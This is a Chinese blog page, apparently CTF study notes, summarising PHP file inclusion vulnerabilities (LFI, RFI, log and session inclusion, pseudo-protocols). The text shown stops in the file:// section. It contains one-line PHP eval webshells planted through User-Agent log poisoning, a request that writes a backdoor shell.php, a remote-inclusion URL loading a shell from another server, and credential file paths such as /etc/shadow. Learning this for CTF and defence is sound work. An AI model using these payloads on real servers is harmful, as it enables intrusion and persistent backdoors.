@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>文件包含漏洞总结 | MIXBP</title>
+  <meta name="keywords" content=" 学习笔记 , 文件包含 ">
+  <meta name="description" content="文件包含漏洞总结 | MIXBP">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP特性">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/01/29/PHP%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="MIXBP">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-29T15:55:03.000Z">
+<meta property="article:modified_time" content="2025-02-01T10:29:07.745Z">
+<meta property="article:author" content="MIXBP">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="PHP特性">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>MIXBP</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://mixbp.github.io/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:2439254357@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+    <a class="more-menus">更多菜单</a>
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(20)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+                <a class="dynamic-menu "
+                   target="_self"
+                   
+                   href="https://mixbp.github.io/">MIXBP</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_blank"
+                        
+                   href="https://mixbp.github.io/">github</a>
+        
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="20">
+<input type="hidden" id="yelog_site_word_count" value="33.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>学习笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>正则表达式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>做题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>filter伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HTML</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>http协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MySQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>payload构造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP特性</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
+           data-tag="学习笔记,linux"
+           data-author="" >
+            <span class="post-title" title="linux基础命令">linux基础命令</span>
+            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/PHP%E7%89%B9%E6%80%A7/"
+           data-tag="学习笔记,PHP特性"
+           data-author="" >
+            <span class="post-title" title="PHP特性">PHP特性</span>
+            <span class="post-date" title="2025-01-29 23:55:03">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="命令执行">命令执行</span>
+            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/ctfshow-web82/"
+           data-tag="做题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
+            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="学习笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
+            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/ctfshow-web160/"
+           data-tag="做题笔记,文件上传,日志包含"
+           data-author="" >
+            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
+            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
+           data-tag="做题笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
+            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/22/upload/"
+           data-tag="学习笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="upload">upload</span>
+            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,python"
+           data-author="" >
+            <span class="post-title" title="python学习笔记">python学习笔记</span>
+            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
+           data-tag="做题笔记,http协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
+            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
+           data-tag="做题笔记,filter伪协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
+            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
+           data-tag="做题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
+            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
+           data-tag="做题笔记,payload构造"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
+            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
+           data-tag="做题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
+            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="学习笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/29/MySQL/"
+           data-tag="学习笔记,MySQL"
+           data-author="" >
+            <span class="post-title" title="MySQL">MySQL</span>
+            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,正则表达式"
+           data-author="" >
+            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
+            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,php"
+           data-author="" >
+            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
+            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,HTML"
+           data-author="" >
+            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
+            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/welcome/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="welcome">welcome</span>
+            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-文件包含漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">文件包含漏洞总结</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">学习笔记</a>
+            
+            <a class="color5">文件包含</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-02-01 03:14:00'>2025-01-29 02:22</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:2.5k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88LFI%EF%BC%89"><span class="toc-text">本地文件包含漏洞（LFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">本地文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BD%BF%E7%94%A8"><span class="toc-text">配合文件上传使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%ABApache%E6%88%96nginx%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">包含Apache或nginx日志文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E4%BB%8B%E7%BB%8D"><span class="toc-text">日志介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="toc-text">日志路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%A6%82%E8%BF%B0"><span class="toc-text">文件上传日志包含概述</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%ABSESSION%E6%96%87%E4%BB%B6"><span class="toc-text">包含SESSION文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">包含临时文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="toc-text">远程文件包含（RFI）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-text">file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E5%8D%8F%E8%AE%AE%EF%BC%88fliter-input%EF%BC%89"><span class="toc-text">php:&#x2F;&#x2F;协议（fliter||input）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-%E5%8D%8F%E8%AE%AE"><span class="toc-text">zip:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-text">data:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-text">伪协议利用条件和方法</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞概述<br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p>
+<p>区别如下:</p>
+<pre><code>require():找不到被包含的文件会产生致命错误，并停止脚本运行
+include():找不到被包含的文件只会产生警告，脚本继续执行
+require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
+include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
+</code></pre>
+<p>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。比如我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用</p>
+<h2 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</p>
+<p>（1）使用绝对路径</p>
+<p>使用绝对路径直接读取:</p>
+<p>（2）使用相对路径进行读取</p>
+<p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。</p>
+<p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p>
+<pre><code>C:\boot.ini //查看系统版本
+C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
+C:\windows\repair\sam //存储Windows系统初次安装的密码
+C:\ProgramFiles\mysql\my.ini //Mysql配置
+C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
+C:\windows\php.ini //php配置信息
+</code></pre>
+<p>Linux&#x2F;Unix系统:</p>
+<pre><code>/etc/password //账户信息
+/etc/shadow //账户密码信息
+/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
+/usr/local/app/php5/lib/php.ini //PHP相关配置
+/etc/httpd/conf/httpd.conf //Apache配置文件
+/etc/my.conf //mysql配置文件
+</code></pre>
+<h3 id="本地文件包含漏洞利用"><a href="#本地文件包含漏洞利用" class="headerlink" title="本地文件包含漏洞利用"></a>本地文件包含漏洞利用</h3><h4 id="配合文件上传使用"><a href="#配合文件上传使用" class="headerlink" title="配合文件上传使用"></a>配合文件上传使用</h4><p>比如有时我们无法绕过文件上传，不能上传webshell，可以先上传一个图片格式的webshell到服务器内，然后再利用本地文件包含漏洞去解析我们的图片格式的webshell</p>
+<p>实例：</p>
+<p>upload靶场pass-15	</p>
+<p><a href="https://mixbp.github.io/2025/01/22/upload/">https://mixbp.github.io/2025/01/22/upload/</a></p>
+<h4 id="包含Apache或nginx日志文件"><a href="#包含Apache或nginx日志文件" class="headerlink" title="包含Apache或nginx日志文件"></a>包含Apache或nginx日志文件</h4><h5 id="日志介绍"><a href="#日志介绍" class="headerlink" title="日志介绍"></a>日志介绍</h5><p>日志是记录系统或应用程序运行时事件的文件。这些记录可以包括错误信息、用户活动、系统性能指标等，帮助开发者和管理员监控和排查问题。</p>
+<p>日志通常会记录多种内容，包括：</p>
+<pre><code>时间戳：事件发生的具体时间。
+用户代理（UA）头：浏览器或客户端的类型和版本。
+IP地址：发起请求的用户的IP地址。
+请求方法：如GET、POST等。
+请求路径：被访问的资源URL。
+响应状态码：服务器对请求的响应状态（如200、404等）。
+用户行为：如点击、表单提交等。
+</code></pre>
+<h5 id="日志路径"><a href="#日志路径" class="headerlink" title="日志路径"></a>日志路径</h5><p>在Apache中，默认日志路径通常是：</p>
+<pre><code>访问日志：/var/log/apache2/access.log（Debian/Ubuntu）
+错误日志：/var/log/apache2/error.log（Debian/Ubuntu）
+</code></pre>
+<p>在NGINX中，默认日志路径通常是：</p>
+<pre><code>访问日志：/var/log/nginx/access.log
+错误日志：/var/log/nginx/error.log
+</code></pre>
+<p>具体路径可能因系统配置而异。</p>
+<h5 id="文件上传日志包含概述"><a href="#文件上传日志包含概述" class="headerlink" title="文件上传日志包含概述"></a>文件上传日志包含概述</h5><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">步骤：</span><br><span class="language-xml">	首先判断是apache服务器还是nginx服务器（抓返回包查看sever头）</span><br><span class="language-xml">	上传一个正常的图片，把UA头修改为后门代码，从而将它写入日志</span><br><span class="language-xml">    上传图片，内容写入恶意代码：包含日志文件。</span><br><span class="language-xml">    利用.user.ini将图片中代码包含入upload下的php文件</span><br><span class="language-xml"></span><br><span class="language-xml">这样造成的结果就是：该php文件中就会包含日志内容，也就包含了后门代码</span><br><span class="language-xml">例如：</span><br><span class="language-xml">ctfshow-web入门文件上传-160</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">注意：这里log被过滤所以使用字符连接绕过</span><br><span class="language-xml"></span><br><span class="language-xml">也可利用日志包含写入木马 </span><br><span class="language-xml">例如：</span><br><span class="language-xml">?file=/var/log/nginx/access.log&amp;1=fputs(fopen(%27shell.php%27,%27w%27),%27</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;mixbp&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">%27);</span><br><span class="language-xml"></span><br><span class="language-xml">这里ua头改为</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<p>ctfshow-web入门文件上传-160	</p>
+<p><a href="https://mixbp.github.io/2025/01/26/ctfshow-web160/">https://mixbp.github.io/2025/01/26/ctfshow-web160/</a></p>
+<h4 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h4><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<p><strong>利用条件:</strong></p>
+<ul>
+<li>找到Session内的可控变量</li>
+<li>Session文件可读写，并且知道存储路径</li>
+</ul>
+<p>session常见存储路径:</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。
+</code></pre>
+<p>实例：</p>
+<p>ctfshow-web文件包含-82</p>
+<p><a href="https://mixbp.github.io/2025/01/29/ctfshow-web82/">https://mixbp.github.io/2025/01/29/ctfshow-web82/</a></p>
+<h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
+<p>常用方法：</p>
+<p>1.配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
+<p>2.通过条件竞争当临时文件未被删除时，包含该临时文件</p>
+<h2 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p>
+<p>例如：</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$path</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/phpinfo.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>源码没有对$path做任何过滤，所以存在文件包含漏洞</p>
+<p>在远端Web服务器&#x2F;site&#x2F;目录下创建一个shell.php文件，利用漏洞去读取文件，内含一句话木马</p>
+<p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p>
+<p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">访问远端Web服务器的shell.php文件：<br><span class="hljs-number">127.0.0.1</span>/include.php?path=xxx.xxx.xxx.xx/site/shell.php?<span class="hljs-number">123123</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数，需要配合文件包含使用</p>
+<p><img src="/../image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93-1.png" alt="img"></p>
+<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
